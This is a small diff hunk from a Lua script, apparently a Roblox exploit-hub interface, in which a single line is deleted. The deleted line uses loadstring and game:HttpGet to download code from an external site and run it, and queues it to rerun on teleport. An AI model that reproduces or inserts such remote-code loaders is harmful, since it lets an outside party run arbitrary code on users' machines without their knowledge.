@@ -2351,8 +2351,6 @@ zdzddz = Miscellaneous2:CreateButton({
     end,
  })
 
-queueteleport(loadstring(game:HttpGet('https://antioderhub.fun'))())
-
 
 
 
